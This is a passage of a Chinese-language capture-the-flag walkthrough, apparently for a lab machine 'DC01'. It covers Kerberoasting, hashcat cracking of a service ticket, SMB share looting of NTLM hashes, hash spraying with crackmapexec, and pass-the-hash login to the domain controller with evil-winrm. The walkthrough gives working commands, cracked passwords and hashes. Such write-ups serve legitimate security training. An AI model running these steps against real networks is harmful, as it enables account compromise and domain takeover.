</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">成功获取到了一对用户密码</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">ybob317:ybob317
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">枚举 Kerberos 服务主体名称（SPNs）</p></div><div class="el-p" data-tag-name="p"><p dir="auto">利用impacket-GetUserSPNs 枚举用户的服务帐户信息，然后使用这些 SPN 获取 Kerberos 服务票证（TGT），借助TGT我们可以向TGS请求获取TGS 并访问对应的服务</p></div><div class="el-p" data-tag-name="p"><p dir="auto">在枚举这些账户之前，我们需要先将攻击机的时间与域控的时间同步，不然会连接失败</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">timedatectl <span class="token function">set-ntp</span> off
rdate <span class="token operator">-</span>n  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128
impacket-GetUserSPNs SOUPEDECODE<span class="token punctuation">.</span>LOCAL/ybob317 <span class="token operator">-</span>dc-ip 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128 <span class="token operator">-</span>usersfile valid\_users<span class="token punctuation">.</span>txt <span class="token operator">-</span>request <span class="token operator">-</span>outputfile spn-users<span class="token punctuation">.</span>tgs
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p el-embed-image" data-is-embed="true" data-embed-type="image" data-tag-name="p"><p dir="auto"><img alt="20.DC01.001" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png" referrerpolicy="no-referrer"></p></div></div></div><div class="el-h2 heading-wrapper" data-heading="5. hashcat破解" data-tag-name="h2"><h2 data-heading="5. hashcat破解" dir="auto" class="heading" id="5._hashcat破解"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>5. hashcat破解</h2><div class="heading-children"><div class="el-p" data-tag-name="p"><p dir="auto">获取到了目标上服务账户的TGS后可以利用hashcat进行爆破</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">hashcat <span class="token operator">-</span>a 0 <span class="token operator">-</span>m 13100 spn-users<span class="token punctuation">.</span>tgs <span class="token operator">/</span>usr/share/wordlists/rockyou<span class="token punctuation">.</span>txt  

<span class="token variable">$krb5tgs</span><span class="token variable">$23</span>$\<span class="token operator">*</span>file\_svc<span class="token variable">$SOUPEDECODE</span><span class="token punctuation">.</span>LOCAL<span class="token variable">$file</span>\_svc\<span class="token operator">*</span><span class="token variable">$819b74fc74d654f64b4ffc</span>                           d59fcaffa8<span class="token variable">$1b2935d454f2797b08b5e5e3b1c9e093b5982e38edfb66c99f2264bcfa472</span>                           84eaccdebc1bd926bde0a24db8ff34869da0d52fdfcaca2fea7e6c3b5476b5c4e231c842                           616b12bf97e643c060983421dd1cf6f358f0569f4214516f0eec01111e543b0035a5dc28                           332619c22e939a86e5a08fa586f06aa8e2c3c553d79057cfde0f60e99a072ee8edbee941                           2043b665fb117284513fb9c78b212af0d8447c6f96ff2cd75e921fda971125a358ac5029                           35ad8f451ef5a441514b331e41196310c20235f38849402bb94d4d7e505d249a3d961a1d                           fecb3e11f7fc395ec3a4d49fb67d44a0c56b46a8bbea697b766bc493b1de8c79428efae7                           1ef27b1ac43ebc85be78d2829dcd0700b09333bfe841a458c90fbba29bd2d997e7b8a5c6                           174104985675bd8e6b78241ee114b15f5e57b66e35467aa89d827cae400c0cf7618acae7                           909eaf536dc1e5cceadb028c5113e269d4de9c75703cc3e8c71883a981a233d7564715b2                           7982284f3943da002846358961d7fb54de55b90ab02f41f0a357a083721601fc7a655815                           a8cc6d20024639be7e610b7fe65969c06ea6efa388e203821c3480605be47e37c44226fc                           dabcec441cf0bfca7e7d99ffdc5ca0a28b8d0c6dd99fa55209dbec51eebd49faeebb1d80                           1efda2c78f966e63767c541cee0d017581770e9780d0316e0173382e6774f95e00b3dda7                           d0eb05f7766b1f76726eb26395561cd9c2d55af8057cc35bfb7b2468006d80ab8c2b68ef                           0281659e598f117bf0d2a57179d4e203256374e1dbb20dfaafd40316c508fc88ac2ccb53                           658ec19d6439f5a2956fc76e24ad09b4ecd452022758f79a0a0878c60e21ceb0059a22dc                           f5965012e9e9a0dab3222180880e0f5da3c0aaddb76587a7452ce2a37b21d7f68d097ef7                           8b25fab43f43d60c59c2b48c9c8542e9c05099ff1a59c66c66731915e3ceddb579ee2dca                           663270904eec929004bb6b9081a37ceb9d6848fed0ce388721ceafe05175a8564b262c04                           3244f90d01d9a51c3291fe4f16091b80ddf883e14e4f2531afb77d25a41f18cbb2b30de0                           f9ecd778821ecb2526041398178b3b58ac0057d0ebba808d6845a4353fdbcd012d9a0887                           4f7e4c24c1ad40cf2c65b053bc056a1479fbc1cb84140c34ec1ead95dd5555794c3c1c66                           57b2b8f5c4f47b2fbd0889dac1ae71dc8f8abdd1ac9ae13d9e2b1192d191811bb6a38f31                           62ea4baf2322b1b38cd6bbf6662c6920a2c71d6e72ac0686cd2aecc7f9f54b499b194f7f                           6ee8ca01f792ff0a784641ea5efed8c0940314efc87fbcdb997e311cc48e95f766d2c6a3                           25ece96089d7ca723195f9ff8812cb807d039d4345ba7def5903ed5d19f995f1720fe3e6                           a3709d01977f086f0fe351e9a767d5ccbc2e9b92bb29715ab0edc32cb800decdbcdf9977                           e3558992782afdd7e56b65e703e1360117af01e8c96149ad27525f9b45b62b0b4a6ea407                           c0a4162789879307cfd7e6cd62ccf01e8ff73:Password123!<span class="token operator">!</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">成功获取到了file_svc用户的密码</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">file\_svc：Password123!<span class="token operator">!</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">看这个名字就知道与文件服务相关</p></div></div></div><div class="el-h2 heading-wrapper" data-heading="6. smb检测一下" data-tag-name="h2"><h2 data-heading="6. smb检测一下" dir="auto" class="heading" id="6._smb检测一下"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>6. smb检测一下</h2><div class="heading-children"><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">crackmapexec smb SOUPEDECODE<span class="token punctuation">.</span>LOCAL <span class="token operator">-</span>u file\_svc <span class="token operator">-</span>p <span class="token string">'Password123!!'</span> <span class="token operator">--</span>shares
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p el-embed-image" data-is-embed="true" data-embed-type="image" data-tag-name="p"><p dir="auto"><img alt="20.DC01.002" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.002.png" referrerpolicy="no-referrer"></p></div><div class="el-p" data-tag-name="p"><p dir="auto">可以发现里面有一个backup 共享</p></div></div></div><div class="el-h2 heading-wrapper" data-heading="7. smbclient连接" data-tag-name="h2"><h2 data-heading="7. smbclient连接" dir="auto" class="heading" id="7._smbclient连接"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>7. smbclient连接</h2><div class="heading-children"><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">smbclient <span class="token operator">-</span>U <span class="token string">'filesvc'</span> <span class="token operator">/</span><span class="token operator">/</span>SOUPEDECODE<span class="token punctuation">.</span>LOCAL/backup
Password <span class="token keyword">for</span> <span class="token namespace">[WORKGROUP\file\_svc]</span>:
<span class="token keyword">Try</span> <span class="token string">"help"</span> to get a list of possible commands<span class="token punctuation">.</span>
smb: \&gt; <span class="token function">ls</span>
  <span class="token punctuation">.</span>                                   D        0  Tue Jun 18 01:41:17 2024
  <span class="token punctuation">.</span><span class="token punctuation">.</span>                                 DR        0  Tue Jun 18 01:44:56 2024
  backup\_extract<span class="token punctuation">.</span>txt                  A      892  Mon Jun 17 16:41:05 2024

                12942591 blocks of size 4096<span class="token punctuation">.</span> 10958701 blocks available
smb: \&gt; <span class="token function">ls</span> <span class="token operator">-</span>la
NT\_STATUS\_NO\_SUCH\_FILE listing \<span class="token operator">-</span>la
smb: \&gt; <span class="token function">dir</span> <span class="token operator">-</span>a
NT\_STATUS\_NO\_SUCH\_FILE listing \<span class="token operator">-</span>a
smb: \&gt; <span class="token function">ls</span> <span class="token operator">-</span>a
NT\_STATUS\_NO\_SUCH\_FILE listing \<span class="token operator">-</span>a
smb: \&gt; <span class="token function">ls</span>
  <span class="token punctuation">.</span>                                   D        0  Tue Jun 18 01:41:17 2024
  <span class="token punctuation">.</span><span class="token punctuation">.</span>                                 DR        0  Tue Jun 18 01:44:56 2024
  backup\_extract<span class="token punctuation">.</span>txt                  A      892  Mon Jun 17 16:41:05 2024

                12942591 blocks of size 4096<span class="token punctuation">.</span> 10958701 blocks available
smb: \&gt; get backup\_extract<span class="token punctuation">.</span>txt
getting file \backup\_extract<span class="token punctuation">.</span>txt of size 892 as backup\_extract<span class="token punctuation">.</span>txt <span class="token punctuation">(</span>58<span class="token punctuation">.</span>1 KiloBytes/sec<span class="token punctuation">)</span> <span class="token punctuation">(</span>average 58<span class="token punctuation">.</span>1 KiloBytes/sec<span class="token punctuation">)</span>
smb: \&gt; <span class="token keyword">exit</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded"><span class="token function">cat</span> backup\_extract<span class="token punctuation">.</span>txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">获取到了一些目标服务账户的NTLM 密码哈希值，利用这些hash搭配前面的用户名单进行枚举，检查是否出现任何重复使用的密码</p></div><div class="el-div" data-callout-metadata="" data-callout-fold="" data-callout="warning" data-tag-name="div"><div data-callout-metadata="" data-callout-fold="" data-callout="warning" class="callout drop-shadow"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-alert-triangle"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"></path><path d="M12 9v4"></path><path d="M12 17h.01"></path></svg></div><div class="callout-title-inner">Warning</div></div><div class="callout-content">
<p dir="auto">在实际渗透测试中，根据环境中的帐户锁定策略限制密码喷射尝试的次数至关重要。这种预防措施有助于防止敏感账户被意外锁定，这可能会干扰我们客户的运营。</p>
</div></div></div><div class="el-pre" data-tag-name="pre"><pre class="language-shell" tabindex="0"><code data-line="0" class="language-shell is-loaded"><span class="token function">cat</span> backup<span class="token punctuation">\</span>_extract.txt <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">'￥'</span> -f1 <span class="token operator">&gt;</span> names.txt
<span class="token function">cat</span> backup<span class="token punctuation">\</span>_extract.txt <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">':'</span> -f4 <span class="token operator">&gt;</span> hashes.txt
crackmapexec smb SOUPEDECODE.LOCAL -u valid<span class="token punctuation">\</span>_users.txt  -H hashes.txt <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">'[-]'</span>

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p el-embed-image" data-is-embed="true" data-embed-type="image" data-tag-name="p"><p dir="auto"><img alt="20.DC01.003" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.003.png" referrerpolicy="no-referrer"></p></div><div class="el-p" data-tag-name="p"><p dir="auto">成功枚举出FileServer$ 用户，这表示我们可以通过这个用户连接到DC01，因为DC对这个用户托管了共享的权限，所以说肯定是可以连接DC01的</p></div></div></div><div class="el-h2 heading-wrapper" data-heading="8. WinRM 连接DC01" data-tag-name="h2"><h2 data-heading="8. WinRM 连接DC01" dir="auto" class="heading" id="8._WinRM_连接DC01"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>8. WinRM 连接DC01</h2><div class="heading-children"><div class="el-pre" data-tag-name="pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">evil-winrm -i <span class="token number">192.168</span>.56.128 -u <span class="token string">"FileServer$"</span> -H e41da7e79a4c76dbd9cf79d1cb325559
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p el-embed-image" data-is-embed="true" data-embed-type="image" data-tag-name="p"><p dir="auto"><img alt="20.DC01.004" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.004.png" referrerpolicy="no-referrer"></p></div><div class="el-p" data-tag-name="p"><p dir="auto">获取<code>fileserver$</code> 用户在域控主机上的权限。</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-shell" tabindex="0"><code data-line="0" class="language-shell is-loaded"> <span class="token function">whoami</span> /all
 <span class="token environment constant">USER</span> INFORMATION
----------------

User Name               SID
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
soupedecode<span class="token punctuation">\</span>fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SOUPEDECODE<span class="token punctuation">\</span>Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Pre-Windows <span class="token number">2000</span> Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY<span class="token punctuation">\</span>NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="token punctuation">\</span>NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="token punctuation">\</span>High Mandatory Level               Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="token keyword">for</span> a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system <span class="token function">time</span>                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force <span class="token function">shutdown</span> from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted <span class="token keyword">for</span> delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working <span class="token builtin class-name">set</span>                                     Enabled
SeTimeZonePrivilege                       Change the <span class="token function">time</span> zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="token keyword">for</span> another user <span class="token keyword">in</span> the same session Enabled


<span class="token environment constant">USER</span> CLAIMS INFORMATION
-----------------------
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">可以发现该用是Administrators组的用户</p></div><div class="el-p" data-tag-name="p"><p dir="auto">那么我们就不需要提权了</p></div><div class="el-p" data-tag-name="p"><p dir="auto">直接读flag</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">\<span class="token operator">*</span>Evil-WinRM\<span class="token operator">*</span> <span class="token function">PS</span> C:\Users\FileServer$\Documents&gt; <span class="token function">type</span> C:\Users\ybob317\Desktop\user<span class="token punctuation">.</span>txt
6bab1f09a7403980bfeb4c2b412be47b
\<span class="token operator">*</span>Evil-WinRM\<span class="token operator">*</span> <span class="token function">PS</span> C:\Users\FileServer$\Documents&gt; <span class="token function">type</span> C:\Users\administrator\desktop\root<span class="token punctuation">.</span>txt
a9564ebc3289b7a14551baf8ad5ec60a
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="mod-footer mod-ui"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
